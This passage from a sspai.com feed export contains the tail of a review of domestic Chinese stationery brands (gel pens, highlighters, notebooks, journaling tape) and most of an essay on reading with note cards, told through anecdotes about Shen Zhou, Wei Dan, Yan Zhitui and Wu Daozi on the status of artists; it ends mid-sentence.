src=\"https://cdn.sspai.com/2021/07/07/ec985e55b93678b7ae92a7724f7cb25b.png\"><figcaption>图来自点石官方旗舰店</figcaption></figure><p>我自己反复购买的一支中性笔是来自它家的「<strong>指间温柔</strong>」系列的按动笔。这个系列的特点就是握胶很软很软，但是也不会软到写字用不上力气。我本身对所有所谓软握胶有点反感，因为我写字握笔姿势不太正确（<s>这点不好，大家不要学我</s>），即便是软握胶长时间书写之后我的手上还是会起茧。最开始是朋友送了我一支，说真的很好用，我半信半疑吃下安利之后，才发现是真的很好用。它的握胶并不是毫无弹性的，而是在软度保证之余，仍给予了一定的支撑力，保证了书写过程中的稳定。</p>\n<p>另外，书写起来也非常顺滑，哪怕是速记的时候，也没有出现断墨飞白的情况。另外按动笔的弹簧质量也非常不错。因为我在发呆或者想事情的时候，经常会无意识地按，有很多支按动笔在我这样地糟蹋下弹簧逐渐失去弹性，用起来也不太便利了。但是这支我经常按，直到我用完油墨按动声音依然清脆。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/5a92e51b3da5a1e39ff89d3c80b5ae6c.jpg\"></figure><p>除了中性笔之外，我还很喜欢点石的荧光笔。其中一个系列我尤其喜欢，那就是「<strong>易手控</strong>」系列。这个系列是一个按动荧光笔，与以往经典的荧光笔拔盖使用不一样，这系列荧光笔是按动出笔而后使用的。这样方便一只手就可以完全控制，也防止了丢盖后油墨被风干。另外这个系列还可以换笔芯。以前的荧光笔很多都是用完就只能扔掉，这一系列可以更换荧光笔的笔芯。笔芯比全新的荧光笔要便宜很多，也更加方便了学生大量囤货。这一系列的荧光笔的笔夹可以按动夹起来，可以夹在书和本皮上，方便携带。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/07/d8a775678ac100bac06d9e20420d964b.jpg\"></figure><p>我现在手头使用的是柔色系系列。颜色温和不刺眼。我本人不太喜欢油墨颜色饱和度太高的荧光笔，因为在期末复习的时候画满要点之后我的眼睛真的很累，闭上眼还能隐隐感觉到有几盏大灯在我眼前晃。它的颜色饱和度相对来说没那么高，不同颜色出现在视野范围内时也不会觉得有冲突。除了柔色系之外，还有别的色系的套装。如果不喜欢套装，也可以挑选自己喜欢的组成一套。目前点石卖的套装比单支买起来要便宜一些，学生如果不需要套装那么多颜色，可以和身边的同学拼一套试试。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/07/a7fae1d1e598c465a3282cdb362b6565.jpg\"></figure><p>很多朋友在使用荧光笔做笔记的时候，有一个很苦恼的问题，就是荧光笔标记过中性笔的笔迹之后，中性笔会糊成一团。这样笔记会变得不太整洁，字迹有时也会难以辨认。这和中性笔的笔墨有关系，和荧光笔的墨也有很大的关系，很多荧光笔会溶掉中性笔的笔迹。这个系列的荧光笔画过中性笔之后，中性笔笔迹有一点点模糊，但是在我接受范围之内。如果是一支油性墨中性笔可能模糊程度会更低。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/07/f0db736d3fe42c378ab1869272476e0e.jpg\"></figure><p>另外我还想特别和大家分享点石的「<strong>轻复古</strong>」系列的彩色中性笔。颜色调得非常好看，也非常速干，笔墨容量也比较大，重心也适中。适合想挑彩色中性笔做笔记的朋友或者手帐爱好者尝试。甚至点石在官方店铺里给你搭配好了同一色系的彩色中性笔和荧光笔，非常便捷。当然，你挑选自己喜欢的不同的单支颜色也可以。我目前用的比较多的是这一支，烟熏玫瑰。颜色非常好看，不是那种饱和度很高的粉色，真的有点以前胶片拍出来的粉玫瑰的感觉（如果形容的不对不要骂我谢谢）。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/07/089d64ec667d1c9981b961d400133f73.jpg\"></figure><hr>\n<h2>KACO</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/article/259ebadf20d84310d1bd8d23afc457ce\"></figure><p>KACO 也是我注意到的国产文具品牌，属于上海文采实业有限公司。之前有很多朋友在评论区提及的小米巨能写，是找这家公司进行代工生产的。</p>\n<p>KACO 的中性笔设计非常简约，外观上几乎很少有装饰，于是受到很多喜欢简约设计的朋友的青睐。笔杆粗细适中，重心也比较合适。虽然是塑料的笔杆，但是拿到手里也有一定的重量，手感也不错。笔杆几乎没有多余的装饰，笔杆的颜色就是笔芯油墨的颜色。下图这支笔是我从一个套装里面拆出来的，颜色我比较喜欢。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/07/1dedc634ae2516affa52ac012bb1bb4b.jpg\"></figure><p>乍一看似乎墨迹比较浅，有人会担心笔迹过浅不适合大面积书写。但是其实并不是对比度很低的颜色，也可以和书本的底色很明显地区分出来。并且中间没有飞白，也没有断墨。容量我觉得也不错，因为我这支笔和我随身记的本子一起带，用了挺长时间了。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/07/a227e3e97934069c09582376f25ae0d9.jpg\"></figure><p>但是在简约之外，它并不乏味。它的彩色中性笔有很多系列，满足喜欢不同风格的朋友，比如国风系列、樱花系列等等。还会在节日推出限定的颜色系列套装，感兴趣的朋友们可以关注一下。</p>\n<hr>\n<h2>东山文具行</h2>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/07/75904a49d53b5a4e9e748309393cc63a.jpg\"></figure><p><strong>东山文具行</strong>来自广东广州，属于广州东山文具有限公司。这个名字可能乍一听非常陌生，但是它名下有一个非常有名的 IP——<strong>小蓝和他的朋友们</strong>。还有一个有名的IP是「<strong>宇宙动物园</strong>」。小蓝的现在的周边非常多，但是对于文具起家的东山文具行，他们的文具做得非常不错。虽然现在还比较小众，但是参加过几次手帐集市，在手帐集市上非常受欢迎。</p>\n<p>我买过小蓝的贴纸，但是相信很多朋友都买过，这里就不再推荐和展示。有一个比较小众的，我买过东山文具行的笔记本，是和 MUJI 一起出的。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/4dc6b6da73baa975f2f165b6bd16146d.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/7933f0570b07b4133c1474dfa8f39ad8.jpg\" alt=\"\"></figure><p>买的这款笔记本是 A5 的，胶装，比较薄，只有35页。我拿来去听讲座的时候做笔记。装订虽然是平装，但是前后封皮的纸质也是比较硬的，在书写的时候不用考虑需要垫板的问题。内页是浅绿色的方格，可能拍出来不太像浅绿色，但是这个颜色真的非常柔和还护眼。内页纸质也不错，没有出现洇墨的情况，兼容了水性笔和油性笔。但是钢笔我还没有测试过。本来想给大家拍一下我之前的笔迹，奈何听讲座的时候笔迹实在是过于潦草，就不给大家分享了。</p>\n<hr>\n<h2>锦一文具（Geeyear）</h2>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/07/article/804a914739c1d91dba2cf24a1798e6c1\" alt=\"Geeyear/é¦ä¸æå·\"></figure><p>锦一文具属于江阴市珂宏贸易有限公司，最早我关注到它的时候，还在做最笔记本，现在已经有了更多的产品品类。</p>\n<p>早些时候我和朋友聊起手帐的时候，朋友对手帐本的印象就是贵，几百块买一个手账本，不一定能坚持下来，感觉入门的门槛太高。如果随便买一个笔记本当手账本，一个是质量不一定能保证，另一个手帐本的内页和普通笔记本还是会有一些不同。</p>\n<p>锦一文具的手账本，是想要入门手帐的朋友一个不错的选择。因为手帐总会有很多拼贴的部分，普通笔记本或者质量较差的手账本会出现「爆本」的情况，即静止放置时本子无法平整合上。但是锦一的手账本几乎很少出现这个问题，在装订的脊部留足了空间，防止「爆本」问题的发生。并且装订确实花了一些成本，不轻易掉页。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/07/5d7d4ab7734a62157357c7840d4e3a7a.png\"><figcaption>图来自锦一官方旗舰店</figcaption></figure><p>如果不考虑手帐的朋友，锦一的笔记本当成普通的记事本也可以用很久很久。一个是它的很多本子都提供了加厚版本的，学生用一整个学期完全没有问题；另一个是同类封皮下它有很多种不同内页，并且内页版式的间距设置也很合理。另外它没有选择克数很重的纸，所以外出携带的时候负担也没那么重。还有是我觉得，它是难得的一群花里胡哨的封皮设计里面仍然保持简约清新的笔记本了。每一个颜色都显得比较「稳重」，封皮上即便有装饰也是相对低调的装饰。喜欢这种风格的朋友我强烈推荐。</p>\n<p>我曾经用过它家的本子，也曾经当成礼物送给了我的朋友，朋友也觉得非常不错。很可惜我用完的本子找不到了，无法和大家分享实拍图。</p>\n<hr>\n<h2>花漾和风手帐</h2>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/07/ba2a361c7eacbd856b9e13e01526d26b.png\"></figure><p>花漾和风手帐如果不是玩手帐的朋友大概率是没有听说过这个品牌的。它属于  ，最开始的产品以胶带和贴纸为主，设计和质量在国产中属于比较优质的，很多手帐爱好者们十分喜欢。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/07/840e5f66e958c4814fb9e93fd7f94153.jpg\"></figure><p>它家的胶带和贴纸风格比较多样化，但是胶带设计图案质量都很高。我个人比较偏爱能日常较多使用的胶带，所以上图中兔兔的日常，就非常对我的胃口。而且它家的胶带图案设计上都很方便剪开，对我这种手残手帐爱好者非常非常友好，经常我就随便剪剪，就可以进行手帐拼贴了。有很多胶带图案过于复杂，经常劝退我这种使用剪刀不太灵活的人。所以我就很喜欢花漾和风的设计，图案一般偏大，图案之间也便于剪开。</p>\n<p>后面它精准识别到了一些手帐爱好者的需求，出了一些其他类别的文具，比如手账本、便签、印章等等。其中手账本日常记事用也完全没问题。我今年就买了它家的手账本作为我的日记本。它家 2021 年的手账本叫「寻梦志」，是半年志，也是可供半年的手账本或者日记本。一般手帐爱好者会在手账本的外面套封皮，但是这个手账本不套封皮也完全可以。封皮虽然是白色，但是如果有污渍，拿湿巾一擦就可以。而且封皮是比较硬的，可以完全保护内页。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/07/d6d16dfee4f72b63d7ae2c535f171043.png\"></figure><p>内页就不方便给大家拍了，因为自己的日记经常胡言乱语。纸质偏白，但是并不是刺眼的白色。这个手账本比较好的一点是，内页没有固定日期，随意日期记或者当成记事本也完全可以。内页虽然是方格内页，但是也在页面一段设置了时间轴，一些朋友也可以按照时间轴来记录。内页纸质也不错，目前我的墨水没有出现洇墨的情况。</p>\n<p>还有一点是，花漾和风的手账本真的都比较便宜，性价比真的很高。</p>\n<p>我还买了一个很有意思的东西，是读书笔记便签。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/08/462f4bd02a5ab80dd109319c8cbb6d34.jpg\"></figure><p>我的读书笔记并没有专门整理成一本，总是会读完就整理到自己的日记里面。这个便签虽然很简单，但是贴上去记录也是有一个标记的作用，翻自己的日记的时候会一下子看到自己读书笔记的地方。便签背后是不干胶，拼贴起来也很方便。觉得好玩的朋友可以尝试一下。</p>\n<hr>\n<p>这里和大家分享了我用过的好用的国货文具品牌。即便一些国货文具在设计上和质量上还有进步和改进的空间，但是不可否认国货文具已经出现了优秀的产品，希望有更多的朋友可以发现优质好用的国货文具产品。</p>\n","link":"https://sspai.com/post/67577"},{"title":"从「卡片笔记」到「卡片桌面」，我用这种方式阅读","date":"2021-08-13 07:24:24","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<h2><strong>前言</strong></h2>\n<p>之前为了回答一个小朋友的问题，写过《<a href=\"https://sspai.com/post/67685\" target=\"_blank\">作者的宇宙</a>》。讲到一个故事何以连接着其他故事、一个作者与其他作者有什么关联、图书馆在实体建筑与目录索引之外的本质是什么，以及读者的真正价值可能在哪儿。</p>\n<p>我请许多人试读，从十岁到二十岁。有趣的是，十岁的读者最快说出了他感兴趣的部分——世界上的书是连接在一起的。十三岁的小朋友一下子就明白了为什么他在用维基百科的时候总是会从一个主题开始，看着看着就会跑到很远的貌似毫不相干的地方去。这些反馈真是让人高兴。</p>\n<p>如果说那篇文章是为了描绘我们从小到大读书时若存若现的那种「趣味」究竟是什么东西，这篇文章就是想要介绍我自己日常读书的方法。熟悉我的朋友或许会知道我念历史学出身，也读社会学、人类学、技术史、小说，也设计实物工具，也讨论技术伦理、科幻设定、电脑与电子技术考古。或许有人会奇怪为什么我的关注会分散到这个程度，那么我希望这样回答——分类像头衔，是外人远望时暂借来用的工具。头脑思考的乐趣则是始终合一的，它自己会在无尽的丛林荒原当中找出有价值的路线。</p>\n<h2><strong>沈周是谁</strong></h2>\n<p>沈周是谁？倘若不知道，那你可认识唐伯虎？明代苏州有著名的「吴门四家」，沈周与唐伯虎名列其中。沈周年纪最大，是这个画派的开创者。这也不足怪，说起万里之外的「佛罗伦萨画派」，普通人也是只记得达芬奇，少有知道马萨乔的。西元 1427 年，也即是大明宣德二年，沈周出生。次年，马萨乔去世。二十四年后，达芬奇诞生。再过一十八年，唐伯虎来了。</p>\n<p>沈周长成这样：</p>\n<p> </p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/22/ffd2d828318e989d4a63092eab16b439.jpg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"img\"><figcaption>沈周</figcaption></figure><p>世事巧么？种种关联有些写在明面上，有些则潜藏在层层表象之下。前者就比如同一个地方（苏州、佛罗伦萨）产生了某些格外吸引艺术家前来的特质（或是年轻人在念书考进士或是学拉丁文做教士之外多了个不错的选择），于是前后相继以成就了某种风格（在外人看来则是派别）。后者好比航海技术与君王大事一起到了某个大不同于前的节点前夜，催动世界改变的能量蓄势待发，冒险家与商人们即将连通了东海西海，苏州与佛罗伦萨几乎前后脚成为艺术之城，自有内在的缘由。</p>\n<p>柯律格《明代的图像与视觉性》中有一则故事。摘录于此。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/572170604b604028b2dad07de956b500.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>明代的图像与视觉性</figcaption></figure><p>即使是电子书，如果要标示出一段内容，也还是得在文字下画一条长长的横线（顶多换一种样式，用模仿荧光笔效果的半透明色彩覆盖住字）。大概是在很多年前我刚刚上初中的时候，开始被教着拿根直尺取平在课本上画这样的横线来标出「重点」（念完初中之后，好像就再也没做过这种事情）。</p>\n<p>然而这则关于沈周的故事并非什么重点——它在作者编织的说明结构中自有它的功用，却不是那种可以被压缩成一两条金句名言以供读者用来表现自己学习到了许多见识，或是可以在闲谈的时候信手引用以示博学多闻的好素材。用流行的词汇来讲，它也无关于「构建自己的知识体系」。此时我画出这条横线，只因为这家电子书平台的设计缺陷：没法子随意选一个坐标放个书签或者超链接，只能用鼠标或手指选中一些文字，标注它们，彰显它们，仿佛作者写下的这几个字要比我选择在某处间隙停放念头更为要紧。</p>\n<p>恰似在漫漫长路上徒步行走时猛一抬头发现眼前的山林或河流抓住了你。是因为云散开了，光照下来，或者是因为形状突然叫你想起了什么。总之，你停了下来，并且想用照片或者画笔或者文字速速地描绘。在这一刻，时空被专属的唯一编号标记了。你想象着在另一个时间、另一个场景无数次回忆、引述「这一个」瞬间，于是这些尚未发生而可能发生的后续事件，让「停下来」这个动作变得丰富起来。</p>\n<p>而我停下来的时候，习惯做一张卡片。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/08/f035bde56a19150cec4cc5a0012fa689.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>卡片1</figcaption></figure><p>这一张卡片本可以被夹在书页当中、储存在盒子里。但一被抽取出来，它最适合的去处，还是四面空白的平面当中，无论那是桌面，或是屏幕。</p>\n<p>看着它，我想起了快二十年前见过的另一段文字，印象单薄了，只记得应该是在三国时，魏国的一个老年大臣被悬吊在大殿高处，战战兢兢地朝着一块匾额上写字。那时我读了一大堆从东汉到南北朝的书，这一段记忆或许来自《三国志·裴松之注》，或许是《世说新语》。</p>\n<p>为何会记得它？实在是难以解释。或许是因为当年读这些书时，不可能去想何处是大纲，何处是要点，就像徒步行走的客旅一样，慢慢地就把整条路程给一点点走完了。因而每一段转弯、每一次上坡或下坡、每一个山口，都隐隐约约一直留在心里。后来偶然见到有一些相像的特征，就难免会让原初的印象浮现出来，哪怕在行走的当时并不知道所在之处叫什么名字。</p>\n<h2><strong>韦仲将能书</strong></h2>\n<p>检索一下，的确在那儿。《世说新语·巧艺》篇有这么一则：「韦仲将能书」。</p>\n<p> </p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/08/e41b6c24d860c2db22992d8d97667843.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>卡片2</figcaption></figure><p> </p>\n<p>韦仲将就是韦诞，身出名门，又居高位，他被卷入这件事里的缘由非常荒诞：魏明帝新建大殿，工匠把没有题名的空白榜匾直接装上了殿额。工匠是否因此受罚甚至丢性命，空白榜匾取下题写后再安装回去有什么不便，后人不得而知。以魏明帝在位时间推算，韦诞当时至少年近五十，只因擅长书艺，就要被高高吊起悬空持大笔去写殿堂的名字。落回地面时，传说他须发一下子变白。</p>\n<p>这两张卡片谁前谁后？或许是读到沈周，让「韦仲将能书」从多年前连续又模糊的印象之海中重新成形变为单独的一桩「记忆」。或许是「韦仲将能书」一直是休眠在头脑中的一点火星，在见到「沈周」的这一刻重新点亮。</p>\n<p>不论如何，现在手持两张卡片，可以做些甚么？</p>\n<p>如果是写考试文章，或去参加个辩论赛，不用操心，自然会有「观点」落到你头上来。倘若遇到的题目是「中国古代艺术家的地位是怎样变化」，二话不说，两张卡片一摞，当作对子打出：</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/08/96b21ef8195acc37546e8a198d11f7f7.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>对子</figcaption></figure><p>中古时代的书法名家韦诞（朝廷公卿）要被强逼着悬空写字。明朝后期的沈周（布衣）被孤陋寡闻的地方官征募去画壁画，事后官员要去向他谢罪。可见吾国艺术家之地位从低而高，天壤之别！</p>\n<p>常人在学校所受的训练，多半就是这样的顺理成章。那么代价如何？在这种简单明了的一问一答一证之后，尚且未知的的可能性将永远未知。看起来没有缺憾，没有疑惑，也即意味着没有新的问题，一切到此为止。</p>\n<p>也可以换种用法，重新拿起这两张卡片，让它们别那么近，留下相隔一千两百年时间差应有的得体距离。让沈周和壁画在一端，让韦诞和殿额在另一端，别让这两个事件的相似性那么快吸引着你给一个结论，朝着各自四周的空白去看看。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/462499a4905749538957ba955bca6683.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>空白</figcaption></figure><h2><strong>流亡之人的家训</strong></h2>\n<p>《世说新语》的作者刘义庆是南北朝时刘宋宗室，年纪不大就病死在建康。一百余年之后，南朝的旗号变换过多次，到了萧姓建立的梁朝。有名门子弟七岁能背诵汉人的长赋，十一岁随父跟从宗室湘东王出镇江州。二十岁出头，朝廷因为内乱倾覆，湘东王自立为帝，他也随之成为清贵朝官。两年之后，临时国都江陵城破，君王死，年轻的大臣变成俘虏被押往北方。其后在北方的连续动荡中，他逃亡、出仕、再次亡国、再次任官……老去时，已经是隋朝官吏、一个北方人。此人是颜之推。他的《颜氏家训》二十来年前我读过一通，当中也有关于韦诞的这则故事。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/08/c62b40d23aaa9562cecb9166c57ad7d4.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>卡片3</figcaption></figure><p>颜之推把这一篇所谈的问题称作「杂艺」，他谈到书法、绘画、弓射、卜筮、算术、医术、琴艺、博戏、投壶、弹棋，全篇情绪低沉，只在结尾说道：「（弹棋）消愁释愦，时可为之」。那么愁从何来？</p>\n<p>或许是因为他年轻时，正见识过一个人恰巧那样多才多艺，从正统的学问到这些边角的「杂艺」消遣一概擅长——他侍奉的第一个君主梁元帝（湘东王）萧绎。而梁元帝的败亡又是那样的迅速、惨烈、仿佛命中注定。</p>\n<p>萧绎同样是个五岁时能背诵《曲礼》六岁能作诗的神童。短短四十七年生涯，政争征伐之外，著书四百余卷，收聚书籍八万卷。他擅书画，所作《职贡图》描绘种种小国、部族使者相貌服饰，今天能见到宋人所复制的摹本。卜筮之道也号称精通。唐人评价他「聪明伎艺，才兼文武」。</p>\n<p>这样一个人，在承圣三年冬季的江陵之战中城破出降后被杀。帝王死于战事或阴谋是我国常有之事，萧绎的败亡却因他自己的举动而成为一个惊天动地的大事，远远超过「金陵王气黯然收」这种一家一姓的退场。</p>\n<p>在围城战的末尾，萧绎挽救战局的一切努力（包括多次亲自临阵督战）均告失败，令他彻底绝望。城破之夜他命令侍从放一把火，把自己一生收集的图书加上宫廷旧藏一共一十四万卷焚烧殆尽。萧绎自己原本要投火自尽，被宫人拉住，便把珍藏的宝剑朝着殿柱劈砍直到崩折。他叹息说：「文武之道，今夜尽矣」，放弃了抵抗。此后西魏军的主将质问道，你为什么要烧毁那么多书籍珍藏。萧绎只说我读书万卷，仍不能避免今日的结局，这些无用之物，当然不如烧掉算了。</p>\n<p>颜之推在城破后被俘，他可能永远都不曾忘记这一夜。他的君主亲口宣告「文武之道」从此到了穷途末路，再无意义。不只是书籍毁于烈火，宝剑崩折于柱，而是在他从小到大以为永恒的这一个通达优雅的士人世界中作为信念从此消逝。在这个时代，人们真心相信正统帝王必然在史籍、谶纬图序乃至宇宙的秩序中占据着一席之地，于是这一份消亡又何尝不是同时被宣告于哲学和自然的某个神秘之处呢？</p>\n<p>或许不止如此，在颜之推眼中「杂艺」的意义也在那一晚一同消亡。擅长书艺和画技又如何，精通占卜与算术又如何，能够欣赏昆虫、鸟儿、马又如何，连被宣告无用的退场都不曾拥有，一场火后，剩余的不过是一些只适合独自或寥寥几人消遣漫长时光的无益之物。因而切勿展露，切勿沉迷，他这样告诫子孙。</p>\n<p>然而上述种种只不过是猜想。他向子孙们讲述此事时，使用的是另一种理由：技艺会令高贵的人受辱，因为那实在是一种无关内在品质和出身根源的事物。高雅之人身怀技艺，便给了他人无视他的品行、格调只以工匠对待他的借口。厮猥之人凭借技艺，也能够被拔擢提升地位，混迹于清贵人物之中。</p>\n<h2><strong>吴道子何许人也</strong></h2>\n<p>颜之推所谓的高雅、高贵之人与厮猥之人，切勿用今天的道德观念去解说。在《杂艺》一篇里，他举过自己的熟人王褒的例子。此公出身琅玡王氏，六朝头一等高门，在江陵败后也被送往关中，因出身门第格外高而受着优待。照着颜之推的说法，就是因为书艺在身，被屡屡要求去写碑文，既不敢推辞，又不免怨恨，反倒希望起自己从来不会这门技艺。在这条里，王褒便是高贵之人被技艺所累而形同劳工的例子。但《资治通鉴》对王褒战时的表现重重着笔——城破之刻，有人提议带兵护住梁元帝突围，王褒劝元帝说此人不可靠，不如主动出降，好过被人叛卖。此人又建议死守江陵内城，王褒则劝说元帝不要理他。西魏军主帅于谨要内城中送出太子来当作受降的人质，元帝让王褒护送。到了敌营，于谨之子听说王褒是书法大家，给他纸笔请他写字，便大笔一挥，写下「柱国常山公（即是于谨）家奴王褒」。</p>\n<p>今天的普通人听闻这则故事，少有不被他的不要脸所惊到的。然而究其本性，倒也不像是后世常见的那种卖国以求荣宠的积极分子，也不像是求生欲望过强（如果真强，当初何不冒死一搏突围试试），反倒像是一个典型的以清闲且显贵为至高价值的六朝人——突围也麻烦，死守也麻烦，只要能不用麻烦，脸面算得上何物？北方人毕竟已不是纯粹的野蛮人，照样要给王氏门第几分面子。而后续情节的确如此发展，西魏权臣宇文泰听说战利品当中有这批人，欣喜过望，说「定楚之功，群贤毕至」，完全不在乎其他。能让王褒偷偷抱怨的，既不是江陵城破后居民死伤殆尽，也不是国家破灭文化丧尽，而是频繁被北方权贵邀约题写碑铭太过操劳麻烦！</p>\n<p>王褒的行为以今天的标准来看自然是极度的可耻，但在此事背后若隐若现的某种价值观念未尝不是六朝时上层人士所共有的。写写字、用一用自身的技能，这究竟是有什么地方让他们觉得羞辱？显然以王褒的节操不大可能会因为服务于北方权贵而羞耻。是因为「杂艺」在正统的儒学与玄学修养之外吗？又或者说是「技艺」本身就天然带有某些低下的特质吗？然而六朝高门的杰出之士又不大可能完全与这些「技艺」绝缘，在被称誉的技艺与被哀叹的技艺之间，必有需要慧眼察觉的不明之物存在。</p>\n<p>《世说新语》中也有一则故事引述了韦诞的遭遇。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/08/ca0a7dfa4e1a64c2e940b91e0fcd72ef.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>卡片4</figcaption></figure><p>王子敬即王献之，此时做着谢安的长史。谢安派人送块空白榜匾请他题字，直接教他丢出门外。谢安不满——三国时候的魏国韦诞韦仲将身为大臣，比子敬你地位更高，不也亲自给殿榜写字么？王献之回他说，就是因为有这种荒唐的事情，魏国才没能传承多久。</p>\n<p>我们原本可以把韦诞之事做一种符合今天理解的解释——即使你是皇帝，让个年纪一大把的朝廷大臣用绳子吊着高空作业去给你做装修，怎么说也不是一件很正当光彩的事情。韦诞自然不敢抱怨皇帝失德，只能回家告诫子孙别学书法，但这并不真的是书法的错对吧？</p>\n<p>然而王献之的这则故事（跟唐朝人修《晋书》时所讲的版本并不完全相同）像是在挑战前一种解释：哪怕是亲近的上司，从你小时候就高看你，处处称赞你，送一块殿额榜来请你题名，写好了自然有工匠去吊装，那也仍然是一件羞辱人的事情。微妙之处在于这种羞辱于当事的一方并不自知（正如西魏那些频频求上门拜托王褒写碑的胡汉权贵不晓得自己是在折磨他），唯有更擅长技艺的王献之才敏锐地察觉到。于是，这真的是书法本身自带的罪过？但一个那么天才那么重要的书法家怎么会有如此分裂的观念呢？</p>\n<p>更可能是因为写榜、写碑与自己消遣、修身乃至交际时写字并不被看成同样的事情。前者或许因为过于实用，成为建筑与陵墓的附属物，因此被当作了某种职业行为。我们拿「专业」、「职业」当作称赞人的词语，但在王献之、刘义庆、颜之推的世界里，一辈子不需要依靠才华和技能谋生，才是赞誉。任何才能一旦落入「职业」的处境，就变成了有害于荣誉和尊严的毒药。他人想方设法取得你的笔墨自己欣赏是一回事，命令你劝说你甚至付钱雇佣你去为某个工程写字却是完全不同的另一件事，因而出身于古老高贵家族的人自然应该处处适可而止，不要任由内心的热情把自己拖入被他人驱使的道路。</p>\n<p>说起来，颜之推算是六朝胜迹飘散时刻的守门人。他对子孙的这些劝诫取材于早年繁花似锦的见闻加上长成后从梁到西魏、从西魏到东魏、从东魏入北齐、从北齐而北周、北周而隋的动荡体验，或许还有一丝对未来岁月的期待——关于旧时代我所记得的一切都已经教给你们了，而新的时代我也不知道将会是什么样子，你们自己竭尽力气适应去罢！</p>\n<p>颜之推死后百余年吴道子生。吴道子何许人也？无家门无世系的无名之辈，以笔墨技艺在尘世里容身。做过小吏、县尉（在今天算是年轻人梦寐以求的中坚公务员职位，但换作颜之推等人来看，就是所谓另一个世界的人），后来被玄宗皇帝招去做翰林院的画待诏。他四处为人绘画，佛寺道观壁画尤其多，据说画过三百多面墙。他不仅频繁作画，并且以此谋生，过着一种颜之推绝不希望后代子孙沾染的职业生活。正是这样一个以技艺为职业、以才能谋生且毫不在意的人，百余年后的《历代名画记》把他列为画圣，再往后苏东坡也叫他画圣。从此往后画圣只有一个，便是吴道子。那么此事是否宣告着世事从此不同？</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/08/b23df2f0a80c794c0e7a3e69e29aa952.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>卡片5</figcaption></figure><p>抽到这张新卡片，会叫人两难。</p>\n<p>看起来从韦仲将到沈周越来越像一条单向渐变的直线，诱惑着你顺水推舟做如下解释：从韦仲将到王献之到吴道子到沈周，艺术家们的才能技艺一步步脱离大臣、名门等身份转而成为一种人们都能看得见摸得着的独立价值。没有人会去在意画圣是否有高门姓氏清贵官职，也没有人会因为沈周没中过进士没做过官就觉得他地位低下。只因艺术从最上层的消遣当中独立出来而有自己内在的传统与评价标准了！</p>\n<p>还有另一种选择，是把吴道子这张卡片多捏住一会儿。拿它填补六朝和明代艺术家故事之间的空白之前，再多想一想它本身能够指向哪些因素。</p>\n<p>前一种选择会快速搭建起一根链条、一堵墙、一条防线，目标单纯——你只需要捍卫它。缺陷同样明显——你的行动自由只剩下一种，就是围着这面防线，用全部心思去查看哪里的链接是松动的，哪一块砖头是空心的，哪些地方只是看起来好像浑然一体其实却留出了一碰就开的空隙，总之你要为质疑辩难做足准备。后一种选择无法给出结论，但手持卡片的人仍然自由，可以去试探着攻击任何一个问题，也可以继续做一个无限平面上的浪游者。你甚至可以先把这个有些复杂的角落抛到脑后继续去读任何你想读的书。像是围棋「封盘」吧？对也不对，截至现在的布局可以被保留着原封不动，但组成这个布局的每一张卡片都仍然可以跑出门去自由行走。或许先带着新问题回来的不是吴道子反而是别人呢？</p>\n<h2><strong>张仲景长沙太守</strong></h2>\n<p>我选第二种路径，暂且忘记这一大堆纠缠不清的人与事，继续翻阅新文章和新书。一篇文章谈到张仲